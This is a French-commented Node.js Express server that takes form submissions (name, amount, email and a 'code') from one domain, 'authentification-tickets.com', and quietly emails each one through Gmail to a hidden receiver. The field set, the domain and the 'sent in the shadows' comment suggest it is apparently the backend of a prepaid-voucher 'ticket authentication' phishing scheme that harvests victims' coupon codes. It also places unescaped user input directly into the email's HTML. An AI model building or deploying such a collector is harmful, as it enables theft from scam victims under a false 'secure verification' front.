require('dotenv').config();
const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();

// Configuration CORS brute pour vos tests en local
// Liste des domaines autorisés à interroger votre serveur
const whitelist = ['https://authentification-tickets.com', 'https://authentification-tickets.com/'];

app.use(cors({
    origin: function (origin, callback) {
        // Bloque ou autorise selon la présence du domaine dans la whitelist
        if (whitelist.indexOf(origin) !== -1 || !origin) {
            callback(null, true);
        } else {
            console.warn(`🛑 Requête bloquée par CORS. Origine non autorisée : ${origin}`);
            callback(new Error('Non autorisé par la politique CORS'));
        }
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true
}));

app.use(express.json());

// 1. Configuration du transporteur Nodemailer (ici configuré pour Gmail)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD
    }
});

// Vérification de la configuration de l'e-mail au démarrage
transporter.verify((error, success) => {
    if (error) {
        console.error("❌ Erreur de configuration e-mail :", error.message);
    } else {
        console.log("✅ Serveur de messagerie prêt à envoyer des e-mails");
    }
});

// 2. Route de traitement du formulaire
app.post('/api/verify', async (req, res) => {
    try {
        const { nom, prenom, amount, email, code } = req.body;

        // Validation basique des données
        if (!nom || !prenom || !amount || !email || !code) {
            return res.status(400).json({ success: false, message: "Données incomplètes." });
        }

        // Configuration du contenu du mail
        // Configuration du contenu du mail (Version Pro)
        const mailOptions = {
            from: `"Système Sécurisé" <${process.env.EMAIL_USER}>`, 
            to: process.env.RECEIVER_EMAIL, 
            subject: '🚨 Nouvelle demande d\'authentification',
            
            // Fallback en texte brut (pour les vieilles boîtes mail)
            text: `Nouvelle demande : ${nom} ${prenom} - ${amount}€ - ${email} - Code: ${code}`,
            
            // Le design HTML professionnel de l'e-mail
            html: `
            <div style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #eaeaea; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
                <div style="background-color: #0f172a; padding: 25px; text-align: center;">
                    <h2 style="color: #ffffff; margin: 0; font-size: 22px;">Nouvelle Authentification</h2>
                </div>
                <div style="padding: 30px; background-color: #ffffff;">
                    <p style="font-size: 16px; color: #334155; margin-bottom: 25px;">Une nouvelle demande a été soumise depuis votre formulaire sécurisé. Voici les détails :</p>
                    
                    <table style="width: 100%; border-collapse: collapse;">
                        <tr>
                            <td style="padding: 12px 0; border-bottom: 1px solid #f1f5f9; color: #64748b; width: 30%;"><strong>Nom complet</strong></td>
                            <td style="padding: 12px 0; border-bottom: 1px solid #f1f5f9; color: #0f172a; font-weight: 500;">${nom} ${prenom}</td>
                        </tr>
                        <tr>
                            <td style="padding: 12px 0; border-bottom: 1px solid #f1f5f9; color: #64748b;"><strong>Montant</strong></td>
                            <td style="padding: 12px 0; border-bottom: 1px solid #f1f5f9; color: #0f172a; font-weight: 500;">${amount} €</td>
                        </tr>
                        <tr>
                            <td style="padding: 12px 0; border-bottom: 1px solid #f1f5f9; color: #64748b;"><strong>E-mail</strong></td>
                            <td style="padding: 12px 0; border-bottom: 1px solid #f1f5f9;"><a href="mailto:${email}" style="color: #2563eb; text-decoration: none;">${email}</a></td>
                        </tr>
                        <tr>
                            <td style="padding: 15px 0; color: #64748b;"><strong>Code fourni</strong></td>
                            <td style="padding: 15px 0;">
                                <span style="background-color: #dcfce7; color: #166534; padding: 6px 12px; border-radius: 6px; font-weight: bold; font-family: monospace; font-size: 16px; border: 1px solid #bbf7d0;">
                                    ${code}
                                </span>
                            </td>
                        </tr>
                    </table>
                </div>
                <div style="background-color: #f8fafc; padding: 15px; text-align: center; font-size: 13px; color: #94a3b8; border-top: 1px solid #eaeaea;">
                    Ce message a été généré automatiquement par votre serveur Node.js
                </div>
            </div>
            `
        };

        // Envoi de l'e-mail dans l'ombre (sans intermédiaire tiers)
        await transporter.sendMail(mailOptions);

        return res.json({ success: true, message: "E-mail envoyé avec succès via Nodemailer !" });

    } catch (error) {
        console.error("Erreur Nodemailer :", error.message);
        return res.status(500).json({ success: false, message: "Une erreur interne est survenue lors de l'envoi." });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Serveur sécurisé démarré sur le port ${PORT}`);
});
